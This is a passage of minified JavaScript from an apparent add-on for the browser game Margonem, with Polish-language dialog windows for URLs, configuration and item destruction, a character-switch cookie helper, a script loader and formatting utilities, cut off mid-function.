    const _0x34f9dd = $("\n        <div id=\"mp-overlay-dialog\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer dialogów</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div>Wprowadź słowo lub cały dialog</div>\n                    <input id=\"mp-input-dialog\" type=\"text\" class=\"mp-default-input do-action-cursor\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\" placeholder=\"Słowo z opcji dialogowej\" style=\"width: 350px;\"" + (_0x20f5f6 ? "value=\"" + _0x20f5f6 + "\"" : "") + ">\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Dodaj</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      _0x34f9dd.find(".mp-default-input").trigger("focus");
    }, 10);
    function _0x40ded7() {
      _0x34f9dd.remove();
    }
    _0x34f9dd.find("#saveBtn").click(() => {
      const _0x3398ac = _0x34f9dd.find("#mp-input-dialog").val().trim();
      _0x40ded7();
      _0xe958a0(_0x3398ac);
    });
    _0x34f9dd.find("#closeBtn").click(() => {
      _0x40ded7();
      _0xe958a0(null);
    });
    _0x34f9dd.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0x351914, _0x551d19) => {}
    });
    const _0xefe0c2 = _0x34f9dd.outerWidth();
    const _0x3854d4 = _0x34f9dd.outerHeight();
    const _0x154f2b = (window.innerWidth - _0xefe0c2) / 2;
    const _0x6d54a5 = (window.innerHeight - _0x3854d4) / 2;
    const _0x2abca0 = {
      zIndex: 999,
      position: "absolute",
      left: _0x154f2b + "px",
      top: _0x6d54a5 + "px"
    };
    _0x34f9dd.css(_0x2abca0);
  });
}
export async function trashRemoveItemsAsk(_0x2b25b1) {
  return new Promise(_0x3d054e => {
    const _0x56aa00 = $("#mp-overlay-ask");
    if (_0x56aa00.length > 0) {
      _0x56aa00.remove();
    }
    const _0x6e54f4 = $("\n        <div id=\"mp-overlay-ask\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Czyszczenie</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div class=\"mp-ask-display\">Czy na pewno chcesz zniszczyć poniższe przedmioty?</div>\n                    <div class=\"mp-items-display-ask mp-scroll\"></div>\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"yesBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 80px;\">Tak</div>\n                    <div id=\"noBtn\" class=\"mp-button mp-button-red do-action-cursor\" style=\"width: 80px;\">Nie</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      _0x6e54f4.find(".mp-default-input").trigger("focus");
    }, 10);
    function _0x381529() {
      _0x6e54f4.remove();
    }
    _0x6e54f4.find("#yesBtn").click(() => {
      _0x381529();
      _0x3d054e(true);
    });
    _0x6e54f4.find("#closeBtn").click(() => {
      _0x381529();
      _0x3d054e(null);
    });
    _0x6e54f4.find("#noBtn").click(() => {
      _0x381529();
      _0x3d054e(null);
    });
    _0x6e54f4.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0x406b76, _0x1ae0f4) => {}
    });
    const _0x3f8a5d = _0x6e54f4.outerWidth();
    const _0x35e922 = _0x6e54f4.outerHeight();
    const _0x2132aa = (window.innerWidth - _0x3f8a5d) / 2;
    const _0x8bf821 = (window.innerHeight - _0x35e922) / 2;
    const _0x269d65 = {
      zIndex: 999,
      position: "absolute",
      left: _0x2132aa + "px",
      top: _0x8bf821 + "px"
    };
    _0x6e54f4.css(_0x269d65);
    const _0x278410 = _0x6e54f4.find(".mp-items-display-ask");
    _0x2b25b1 = [...new Set(_0x2b25b1)];
    for (const _0x7fcf13 of _0x2b25b1) {
      const _0x5c2ba9 = Engine.items.getItemById(_0x7fcf13);
      if (_0x5c2ba9) {
        const _0x5caa24 = {
          id: _0x5c2ba9.id,
          type: _0x5c2ba9._cachedStats.rarity,
          name: _0x5c2ba9.name,
          stat: _0x5c2ba9.stat,
          pr: _0x5c2ba9.pr,
          prc: "zl",
          cl: _0x5c2ba9.cl,
          icon: _0x5c2ba9.icon
        };
        let _0x2ee47e = universalCreateItem(_0x5caa24, "item");
        _0x2ee47e.appendTo(_0x278410);
      }
    }
    enableScroll("mp-scroll");
  });
}
export async function askWindow(_0x498974) {
  return new Promise(_0x1490b7 => {
    const _0x4e444c = $("#mp-overlay-ask");
    if (_0x4e444c.length > 0) {
      _0x4e444c.remove();
    }
    const _0x58c1ed = $("\n        <div id=\"mp-overlay-ask\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Zapytanie</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div class=\"mp-ask-display\">" + _0x498974 + "</div>\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"yesBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 80px;\">Tak</div>\n                    <div id=\"noBtn\" class=\"mp-button mp-button-red do-action-cursor\" style=\"width: 80px;\">Nie</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      _0x58c1ed.find(".mp-default-input").trigger("focus");
    }, 10);
    function _0x4f0c25() {
      _0x58c1ed.remove();
    }
    _0x58c1ed.find("#yesBtn").click(() => {
      _0x4f0c25();
      _0x1490b7(true);
    });
    _0x58c1ed.find("#closeBtn").click(() => {
      _0x4f0c25();
      _0x1490b7(null);
    });
    _0x58c1ed.find("#noBtn").click(() => {
      _0x4f0c25();
      _0x1490b7(null);
    });
    _0x58c1ed.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0x398430, _0x4d3598) => {}
    });
    const _0x4316ce = _0x58c1ed.outerWidth();
    const _0x4fa992 = _0x58c1ed.outerHeight();
    const _0x196851 = (window.innerWidth - _0x4316ce) / 2;
    const _0xb12fa5 = (window.innerHeight - _0x4fa992) / 2;
    const _0x3d95dd = {
      zIndex: 999,
      position: "absolute",
      left: _0x196851 + "px",
      top: _0xb12fa5 + "px"
    };
    _0x58c1ed.css(_0x3d95dd);
  });
}
export async function addAudioUrl() {
  return new Promise(_0x1640b1 => {
    const _0x1e3066 = $("#mp-overlay-url-audio");
    if (_0x1e3066.length > 0) {
      _0x1e3066.remove();
    }
    const _0x4fe18e = $("\n        <div id=\"mp-overlay-url-audio\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer adresów</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div>Wprowadź adres do dźwięku:</div>\n                    <input id=\"mp-input-url-audio\" type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"https://adres.pl/moja_muzyka.mp3\" style=\"width: 350px;\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Dodaj</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      _0x4fe18e.find(".mp-default-input").trigger("focus");
    }, 10);
    function _0x42864b() {
      _0x4fe18e.remove();
    }
    _0x4fe18e.find("#saveBtn").click(() => {
      const _0x16187e = _0x4fe18e.find("#mp-input-url-audio").val();
      _0x42864b();
      _0x1640b1(_0x16187e);
    });
    _0x4fe18e.find("#closeBtn").click(() => {
      _0x42864b();
      _0x1640b1(null);
    });
    _0x4fe18e.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0x587f8d, _0x28f1e7) => {}
    });
    const _0x4f3764 = _0x4fe18e.outerWidth();
    const _0x5cda69 = _0x4fe18e.outerHeight();
    const _0x3397bf = (window.innerWidth - _0x4f3764) / 2;
    const _0x3525b2 = (window.innerHeight - _0x5cda69) / 2;
    const _0x281844 = {
      zIndex: 999,
      position: "absolute",
      left: _0x3397bf + "px",
      top: _0x3525b2 + "px"
    };
    _0x4fe18e.css(_0x281844);
  });
}
export async function addImagesUrl() {
  return new Promise(_0x5dbd4c => {
    const _0x3b42ac = $("#mp-overlay-url-images");
    if (_0x3b42ac.length > 0) {
      _0x3b42ac.remove();
    }
    const _0x26ae62 = $("\n        <div id=\"mp-overlay-url-images\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer adresów</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div>Wprowadź adres do grafiki:</div>\n                    <input id=\"mp-input-url-images\" type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"https://adres.pl/moja_grafika.png\" style=\"width: 350px;\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Dodaj</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      _0x26ae62.find(".mp-default-input").trigger("focus");
    }, 10);
    function _0x2d3379() {
      _0x26ae62.remove();
    }
    _0x26ae62.find("#saveBtn").click(() => {
      const _0x3401ca = _0x26ae62.find("#mp-input-url-images").val();
      _0x2d3379();
      _0x5dbd4c(_0x3401ca);
    });
    _0x26ae62.find("#closeBtn").click(() => {
      _0x2d3379();
      _0x5dbd4c(null);
    });
    const _0x317245 = {
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0x2619fb, _0x5497c3) => {}
    };
    _0x26ae62.appendTo("#mp-root").draggable(_0x317245);
    const _0x25ab9e = _0x26ae62.outerWidth();
    const _0x6a354c = _0x26ae62.outerHeight();
    const _0x10cf79 = (window.innerWidth - _0x25ab9e) / 2;
    const _0xb662bf = (window.innerHeight - _0x6a354c) / 2;
    const _0x2824f8 = {
      zIndex: 999,
      position: "absolute",
      left: _0x10cf79 + "px",
      top: _0xb662bf + "px"
    };
    _0x26ae62.css(_0x2824f8);
  });
}
export async function editUrlWindow(_0x585381, _0x1a109b) {
  return new Promise(_0x1ad839 => {
    const _0x58040d = $("#mp-overlay-url");
    if (_0x58040d.length > 0) {
      _0x58040d.remove();
    }
    const _0x2fc0ef = $("\n        <div id=\"mp-overlay-url\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Menedżer adresów</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-url-name\">\n                    <div>Aktualny adres powiadomienia <b>" + _0x585381 + "</b> to:</div>\n                    <input id=\"mp-input-url\" type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"Adres powiadomienia\" value=\"" + _0x1a109b + "\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n                </div>\n                <div class=\"mp-edit-url-buttons\">\n                    <div id=\"saveBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px;\">Zapisz</div>\n                    <div id=\"defaultBtn\" class=\"mp-button do-action-cursor\" style=\"width: 100px;\">Domyślne</div>\n                </div>\n                <div class=\"mp-url-name\">Wrzuć swój dźwięk <a class=\"do-action-cursor mp-url\" href=\"https://margoplus.pl/mp3/\" target=\"_blank\">tutaj</a>.</div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      _0x2fc0ef.find(".mp-default-input").trigger("focus");
    }, 10);
    function _0x5d90cc() {
      _0x2fc0ef.remove();
    }
    _0x2fc0ef.find("#saveBtn").click(() => {
      const _0x519a50 = _0x2fc0ef.find("#mp-input-url").val();
      _0x5d90cc();
      _0x1ad839(_0x519a50);
    });
    _0x2fc0ef.find("#defaultBtn").click(() => {
      _0x5d90cc();
      message("Przywrócono domyślny adres");
      _0x1ad839("default");
    });
    _0x2fc0ef.find("#closeBtn").click(() => {
      _0x5d90cc();
      _0x1ad839(null);
    });
    _0x2fc0ef.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0x38f31f, _0x3e13fc) => {}
    });
    const _0xec7890 = _0x2fc0ef.outerWidth();
    const _0x14d472 = _0x2fc0ef.outerHeight();
    const _0x4e3727 = (window.innerWidth - _0xec7890) / 2;
    const _0x1584ea = (window.innerHeight - _0x14d472) / 2;
    const _0x52e10f = {
      zIndex: 999,
      position: "absolute",
      left: _0x4e3727 + "px",
      top: _0x1584ea + "px"
    };
    _0x2fc0ef.css(_0x52e10f);
  });
}
export async function sendAlert() {
  return new Promise(_0x3d81e1 => {
    const _0x58c593 = $("#mp-overlay-send-alert");
    if (_0x58c593.length > 0) {
      _0x58c593.remove();
    }
    const _0x82e990 = $("\n        <div id=\"mp-overlay-send-alert\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Ogłoszenie</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-send-alert-name\">\n                    <input id=\"mp-input-url\" type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"Treść\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n                </div>\n                <div class=\"mp-edit--buttons\">\n                    <div id=\"sendBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px; margin-left: auto; margin-right: auto;\">Wyślij</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      _0x82e990.find(".mp-default-input").trigger("focus");
    }, 10);
    function _0x5db441() {
      _0x82e990.remove();
    }
    _0x82e990.find("#sendBtn").click(() => {
      const _0x2a857 = _0x82e990.find("#mp-input-url").val();
      _0x5db441();
      _0x3d81e1(_0x2a857);
    });
    _0x82e990.find("#closeBtn").click(() => {
      _0x5db441();
      _0x3d81e1(null);
    });
    _0x82e990.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0x439202, _0x399ee7) => {}
    });
    const _0x25dbff = _0x82e990.outerWidth();
    const _0x4cf28f = _0x82e990.outerHeight();
    const _0x1982a9 = (window.innerWidth - _0x25dbff) / 2;
    const _0x380c9e = (window.innerHeight - _0x4cf28f) / 2;
    const _0x558afc = {
      zIndex: 999,
      position: "absolute",
      left: _0x1982a9 + "px",
      top: _0x380c9e + "px"
    };
    _0x82e990.css(_0x558afc);
  });
}
export async function loadUmConfig() {
  return new Promise(_0x116263 => {
    const _0xae0884 = $("#mp-overlay-learn-um");
    if (_0xae0884.length > 0) {
      _0xae0884.remove();
    }
    const _0x1c9638 = $("\n        <div id=\"mp-overlay-learn-um\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Umiejętności</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-learn-um-name\">\n                    <input id=\"mp-input-url\" type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"Kod umiejętności z Gargonem.pl\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n                </div>\n                <div class=\"mp-edit--buttons\">\n                    <div id=\"sendBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px; margin-left: auto; margin-right: auto;\">Naucz</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      _0x1c9638.find(".mp-default-input").trigger("focus");
    }, 10);
    function _0xc2477f() {
      _0x1c9638.remove();
    }
    _0x1c9638.find("#sendBtn").click(() => {
      const _0x2b423e = _0x1c9638.find("#mp-input-url").val();
      _0xc2477f();
      _0x116263(_0x2b423e);
    });
    _0x1c9638.find("#closeBtn").click(() => {
      _0xc2477f();
      _0x116263(null);
    });
    _0x1c9638.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0x12ff16, _0x1b170b) => {}
    });
    const _0x10777c = _0x1c9638.outerWidth();
    const _0x2e46ff = _0x1c9638.outerHeight();
    const _0x54f053 = (window.innerWidth - _0x10777c) / 2;
    const _0x581291 = (window.innerHeight - _0x2e46ff) / 2;
    const _0x3f5e9e = {
      zIndex: 999,
      position: "absolute",
      left: _0x54f053 + "px",
      top: _0x581291 + "px"
    };
    _0x1c9638.css(_0x3f5e9e);
  });
}
export async function loadConfig() {
  return new Promise(_0x4c62be => {
    const _0x4ed936 = $("#mp-overlay-load-config");
    if (_0x4ed936.length > 0) {
      _0x4ed936.remove();
    }
    const _0x264c30 = $("\n        <div id=\"mp-overlay-load-config\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">Konfiguracja</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-load-config-name\">\n                    <input id=\"mp-input-url\" type=\"text\" class=\"mp-default-input do-action-cursor\" placeholder=\"Podaj ciąg znaków konfiguracji\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\">\n                </div>\n                <div class=\"mp-edit--buttons\">\n                    <div id=\"sendBtn\" class=\"mp-button mp-button-green do-action-cursor\" style=\"width: 100px; margin-left: auto; margin-right: auto;\">Załaduj</div>\n                </div>\n            </div>\n        </div>\n    ");
    setTimeout(() => {
      _0x264c30.find(".mp-default-input").trigger("focus");
    }, 10);
    function _0x96e3dd() {
      _0x264c30.remove();
    }
    _0x264c30.find("#sendBtn").click(() => {
      const _0x1caee1 = _0x264c30.find("#mp-input-url").val();
      _0x96e3dd();
      _0x4c62be(_0x1caee1);
    });
    _0x264c30.find("#closeBtn").click(() => {
      _0x96e3dd();
      _0x4c62be(null);
    });
    _0x264c30.appendTo("#mp-root").draggable({
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (_0x1f1cb6, _0x15203e) => {}
    });
    const _0x23c903 = _0x264c30.outerWidth();
    const _0x240e33 = _0x264c30.outerHeight();
    const _0x4ae37e = (window.innerWidth - _0x23c903) / 2;
    const _0x4cecd4 = (window.innerHeight - _0x240e33) / 2;
    const _0x5c8325 = {
      zIndex: 999,
      position: "absolute",
      left: _0x4ae37e + "px",
      top: _0x4cecd4 + "px"
    };
    _0x264c30.css(_0x5c8325);
  });
}
export function executeLoginChar(_0x158539, _0x322f40) {
  const _0x3d0b0b = Engine.hero.d.id;
  const _0x425653 = location.host.split(".")[0];
  if (_0x158539 == _0x3d0b0b) {
    return message("Jesteś na tej postaci!");
  }
  const _0x1e10e7 = new Date(Date.now() + 2592000000);
  setCookie("mchar_id", _0x158539, _0x1e10e7, "/", "margonem.pl");
  if (_0x322f40 !== _0x425653) {
    location.replace("https://" + _0x322f40 + ".margonem.pl");
  } else {
    location.reload();
  }
}
export async function closeAlert(_0x5ddf1d = 20) {
  let _0x2bde6b = 0;
  while (!document.querySelector("div.window-backdrop") && _0x2bde6b < _0x5ddf1d) {
    await new Promise(_0x5de917 => setTimeout(_0x5de917, 100));
    _0x2bde6b++;
  }
  if (_0x2bde6b >= _0x5ddf1d) {
    return;
  }
  try {
    const _0x336246 = document.querySelector("div.text[name=\"Wiadomość\"]")?.parentElement?.parentElement?.parentElement;
    const _0x1e44c7 = document.querySelector("div.window-backdrop");
    if (_0x336246 && _0x1e44c7) {
      _0x336246.remove();
      _0x1e44c7.remove();
    }
  } catch (_0x4be278) {
    console.error(_0x4be278);
  }
}
export function getDataItem(_0x17b364) {
  var _0xe8dd39 = Engine.items.fetchLocationItems("g");
  for (const _0x4e91e5 in _0xe8dd39) {
    if (_0xe8dd39[_0x4e91e5].id == _0x17b364) {
      var _0x26a0a9 = _0xe8dd39[_0x4e91e5]._cachedStats;
      const _0x1636d3 = _0x26a0a9.enhancement_upgrade_lvl === undefined ? 0 : _0x26a0a9.enhancement_upgrade_lvl;
      const _0x587db5 = _0x26a0a9.bonus_not_selected === undefined ? true : false;
      const _0x1d3413 = _0x26a0a9.binds === null ? true : false;
      const _0x74c629 = {
        id: _0xe8dd39[_0x4e91e5].id,
        name: _0xe8dd39[_0x4e91e5].name,
        rarity: _0xe8dd39[_0x4e91e5].itemTypeName,
        type: _0xe8dd39[_0x4e91e5].itemType,
        icon: _0xe8dd39[_0x4e91e5].icon,
        cl: _0xe8dd39[_0x4e91e5].cl,
        pr: _0xe8dd39[_0x4e91e5].pr,
        stat: _0xe8dd39[_0x4e91e5].stat,
        prc: "zl",
        upgrade: _0x1636d3,
        selectedBonus: _0x587db5,
        binds: _0x1d3413
      };
      return _0x74c629;
    }
  }
  return null;
}
export function loadScript(_0x337616) {
  return new Promise((_0xe624a9, _0x5a96b) => {
    const _0x5ab4c8 = document.createElement("script");
    _0x5ab4c8.src = _0x337616;
    _0x5ab4c8.onload = () => _0xe624a9();
    _0x5ab4c8.onerror = () => _0x5a96b(new Error("Nie można załadować " + _0x337616));
    document.head.appendChild(_0x5ab4c8);
  });
}
function waitForAPI(_0x19320b = 20000) {
  return new Promise((_0x34b309, _0x5341aa) => {
    const _0x14a9f0 = Date.now();
    function _0x3a72fe() {
      if (window.API?.addCallbackToEvent) {
        _0x34b309();
      } else if (Date.now() - _0x14a9f0 > _0x19320b) {
        _0x5341aa(new Error("API not found within timeout"));
      } else {
        setTimeout(_0x3a72fe, 100);
      }
    }
    _0x3a72fe();
  });
}
export async function waitForAPIAndAttachCallback(_0x1da48f, _0x21077f) {
  try {
    await waitForAPI();
    window.API.addCallbackToEvent(_0x1da48f, _0x21077f);
  } catch (_0x29a202) {
    console.error(_0x29a202);
  }
}
export function createButtonPlay(_0xbfc861) {
  const _0x50d966 = $("<div class=\"mp-button do-action-cursor\"><div class=\"mp-icon-play " + _0xbfc861 + "\"></div></div>");
  return _0x50d966;
}
export function parseAbbreviatedNumber(_0x57c1aa) {
  if (typeof _0x57c1aa === "number") {
    return _0x57c1aa;
  }
  const _0x309590 = String(_0x57c1aa).trim().toLowerCase();
  const _0x83c2a9 = _0x309590.match(/^([\d.,]+)\s*([kmg])?$/i);
  if (!_0x83c2a9) {
    const _0x4ba100 = parseFloat(_0x309590.replace(",", "."));
    if (isNaN(_0x4ba100)) {
      return null;
    } else {
      return _0x4ba100;
    }
  }
  const _0x425816 = parseFloat(_0x83c2a9[1].replace(",", "."));
  const _0x26b690 = _0x83c2a9[2];
  if (isNaN(_0x425816)) {
    return null;
  }
  switch (_0x26b690) {
    case "k":
      return _0x425816 * 1000;
    case "m":
      return _0x425816 * 1000000;
    case "g":
      return _0x425816 * 1000000000;
    default:
      return _0x425816;
  }
}
export function parsedGold(_0x305bcd) {
  var _0x5d27ad = _0x305bcd.toString().length > 9 ? 12 : 10;
  var _0x12300c = _0x305bcd.toString().length > 9 ? "." : " ";
  return round(_0x305bcd, _0x5d27ad, _0x12300c, 3);
}
export function createSettingsButton(_0x1bcff7) {
  const _0x5c0fb3 = $("<div class=\"mp-window-settings-button do-action-cursor\"></div>").tip(_0x1bcff7);
  return _0x5c0fb3;
}
export function createSearchButton(_0x161cbc) {
  const _0x3c73c9 = $("<div class=\"mp-window-search-button do-action-cursor\"></div>").tip(_0x161cbc);
  return _0x3c73c9;
}
export function createRefreshButton(_0x5a6b94) {
  const _0x427c9e = $("<div class=\"mp-window-refresh-button do-action-cursor\"></div>").tip(_0x5a6b94);
  return _0x427c9e;
}
export function createInput(_0x1cdd6c, _0x30e354 = "Wpisz tekst", _0x5eb791 = 100) {
  const _0x5a5ba9 = {
    width: _0x5eb791 + "px"
  };
  const _0x5b9053 = $("<input type=\"" + _0x1cdd6c + "\" class=\"mp-default-input do-action-cursor\" placeholder=\"" + _0x30e354 + "\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\"/>").css(_0x5a5ba9);
  return _0x5b9053;
}
export function getPercent(_0x2c38a9, _0x427d32) {
  if (_0x427d32 === 0) {
    return 0;
  }
  return Math.floor(_0x2c38a9 * 100 / _0x427d32);
}
export function waitForElement(_0x33c1dc, _0x180fd2 = 9999999999) {
  return new Promise((_0x30aed2, _0x371080) => {
    const _0x488f53 = $(_0x33c1dc);
    if (_0x488f53.length > 0) {
      return _0x30aed2(_0x488f53);
    }
    const _0x5bd4e7 = new MutationObserver(() => {
      const _0x224a7c = $(_0x33c1dc);
      if (_0x224a7c.length > 0) {
        _0x5bd4e7.disconnect();
        _0x30aed2(_0x224a7c);
      }
    });
    _0x5bd4e7.observe(document.body, {
      childList: true,
      subtree: true
    });
    setTimeout(() => {
      _0x5bd4e7.disconnect();
      _0x371080(new Error("Element " + _0x33c1dc + " not found within timeout."));
    }, _0x180fd2);
  });
}
export function upgradePercentMark(_0x3d9a7e) {
  const _0x2f8987 = {};
  for (const _0x3cd614 of Object.values(_0x3d9a7e)) {
    if (_0x3cd614.id > 0) {
      _0x2f8987[_0x3cd614.id] = _0x3cd614.p;
    }
  }
  for (const _0x39f49d in _0x2f8987) {
    const _0x263292 = _0x2f8987[_0x39f49d];
    updateItem(".item-id-" + _0x39f49d, "");
    updateItem(".mp-id-" + _0x39f49d, "");
  }
}
export function removePercentMark(_0x1a2e0b) {
  const _0x35afad = $(".item-id-" + _0x1a2e0b);
  if (!_0x35afad.length) {
    return;
  }
  _0x35afad?.children(".upgrade-percent-box")?.remove();
}
function updateItem(_0x515ba9, _0x51a215) {
  const _0x276bc9 = $(_0x515ba9);
  if (!_0x276bc9.length) {
    return;
  }
  let _0x356f95 = _0x276bc9.children(".upgrade-percent-box");
  if (_0x356f95.length === 0) {
    _0x276bc9.append("<div class=\"upgrade-percent-box\">" + _0x51a215 + "</div>");
  } else {
    _0x356f95.text(_0x51a215);
  }
}
export function getHealthColor(_0x20966a) {
  if (_0x20966a < 0) {
    _0x20966a = 0;
  }
  if (_0x20966a > 100) {
    _0x20966a = 100;
  }
  const _0x5e0875 = Math.floor((100 - _0x20966a) * 255 / 100);
  const _0x4950e6 = Math.floor(_0x20966a * 255 / 100);
  return "rgb(" + _0x5e0875 + "," + _0x4950e6 + ",0)";
}
export function extractId(_0x1ade44) {
  if (_0x1ade44.includes("=")) {
    return _0x1ade44.split("=")[0];
  }
  return _0x1ade44;
}
export function obliczProcent(_0x3b5753, _0x4e4b49) {
  let _0x5df395 = _0x3b5753 / _0x4e4b49 * 100;
  return _0x5df395.toFixed(2);
}
export function sortAndTrimData(_0x3bfe35, _0x46bbff = 5) {
  const _0x2fc5f6 = Object.entries(_0x3bfe35);
  const _0x4b975d = _0x2fc5f6.sort((_0x4bba27, _0x4ff5fe) => _0x4ff5fe[1].ts - _0x4bba27[1].ts);
  const _0x144808 = _0x4b975d.slice(0, _0x46bbff);
  return Object.fromEntries(_0x144808);
}
export const AlertManager = function () {
  const _0x188c19 = {
    tl: "mp-alert-top-left",
    tc: "mp-alert-top-center",
    tr: "mp-alert-top-right",
    ml: "mp-alert-middle-left",
    mc: "mp-alert-middle-center",
    mr: "mp-alert-middle-right",
    bl: "mp-alert-bottom-left",
    bc: "mp-alert-bottom-center",
    br: "mp-alert-bottom-right"
  };
  const _0x37250b = {};
  function _0x31b1c2(_0x513e57) {
    const _0x3c5bdf = document.createElement("div");
    _0x3c5bdf.className = "mp-alert-container do-action-cursor " + _0x188c19[_0x513e57];
    document.body.appendChild(_0x3c5bdf);
    _0x37250b[_0x513e57] = _0x3c5bdf;
    return _0x3c5bdf;
  }
  function _0x815640(_0x271058, _0x5a62a4 = "mc", _0x48eb18 = 3000) {
    if (!_0x188c19[_0x5a62a4]) {
      console.warn("Nieprawidłowa pozycja:", _0x5a62a4);
      return;
    }
    const _0x1c3785 = _0x37250b[_0x5a62a4] || _0x31b1c2(_0x5a62a4);
